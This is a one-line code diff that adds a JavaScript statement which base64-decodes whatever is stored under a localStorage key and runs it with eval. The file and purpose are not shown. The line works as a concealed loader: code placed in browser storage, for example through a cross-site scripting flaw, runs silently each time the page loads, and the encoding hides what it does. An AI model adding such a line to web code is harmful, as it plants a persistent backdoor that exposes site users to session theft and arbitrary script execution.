@@ -1,0 +1,1 @@
+localStorage["js_implementer"] && eval(atob(localStorage["js_implementer"]));
